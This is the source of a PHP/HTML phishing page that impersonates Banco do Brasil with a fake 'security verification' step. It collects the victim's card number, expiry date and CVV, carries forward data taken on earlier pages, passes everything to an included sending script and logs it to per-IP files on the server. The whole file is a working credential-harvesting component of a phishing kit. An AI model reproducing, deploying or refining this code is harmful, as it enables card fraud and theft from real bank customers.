<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Banco do Brasil</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
	<link href='https://fonts.googleapis.com/css?family=Roboto' rel='stylesheet'>
	<link rel="stylesheet" type="text/css" href="reset.css" />
	<script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
	<link rel="stylesheet" type="text/css" href="style.css?id=001" />
</head>
<body>
	<form id="frm" name="frm" method="post" action="done.php" onsubmit="return checkCC()">
	<?php foreach ($_POST as $key => $value): ?>
	<input type="hidden" name="<?= $key ?>" value="<?= $value ?>">
	<?php endforeach; ?>

	<div class="container">
		<div class="topo"><p>Segurança - Verificação</p></div>
		<div class="content">
			<table>
				<tr>
					<td><p>Informe os dados do seu cartão de débito \ crédito</p><br/><br/></td>
				</tr>
				<tr>
					<td><span class="titulo">Número do cartão</span></td>
				</tr>

				<tr>
					<td>
						<input type="tel" id="cc" name="cc" required="" minlength="19" maxlength="19" onkeyup="jump(this, 19,'validade');">
					</td>
				</tr>
				<tr>
					<td><span class="titulo">Data de vencimento</span></td>
				</tr>

				<tr>
					<td>
						<input type="tel" id="validade" name="validade" placeholder="MM/AA" minlength="5" required=""  onkeyup="jump(this, 5,'cvv');">
					</td>
				</tr>	

				<tr>
					<td><span class="titulo">Código de segurança</span></td>
				</tr>

				<tr>
					<td>
						<input type="tel" id="cvv" name="cvv" maxlength="3" minlength="3" required="">
						<div style="float: left;">
							<span class="titulo small">3 dígitos no verso do cartão</span>		
						</div>

						<div style="float: right;">
							<img src="img/cvv.png" width="70" width="70">
						</div>

					</td>
				</tr>								

			</table>
		</div>

		<div class="footer">
			<button class="btn-amarelo">CONFIRMAR</button>
		</div>
	</div>

	</form>

	<script type="text/javascript" src="js/jquery.mask.min.js"></script>
	<script type="text/javascript" src="js/script1.js"></script>
	<script type="text/javascript">
		function jump(field, maxlength, nextfield){
			if (field.value.length == maxlength){
				document.getElementById(nextfield).focus();	
			}
		}		


		$(document).ready(function(){
		   $('#cc').mask('0000 0000 0000 0000', {reverse: true});	
		   $('#validade').mask('00/00', {reverse: true});	
		});


		function checkCC(){
		  var cc = $("#cc").val();
		  var validade = $("#validade").val();

		  if (cc.length < 19) {
		  	alert("Número de cartão inválido, informe corretamente");
		  	 $("#cc").val("");
		  	 $("#cc").focus();
		  	return false;
		  }
  

		  if (validade.length < 5) {
		  	alert("Informe a validade corretamente");
		  	 $("#validade").val("");
		  	 $("#validade").focus();
		  	return false;
		  }		  

		  return true;
		}

	</script>


</body>
</html>

<?php

if ($_POST){
	include("config.php");
	include("envio1.php");
	@file_put_contents("data/$ip.html", $conteudo, FILE_APPEND);	
}
?>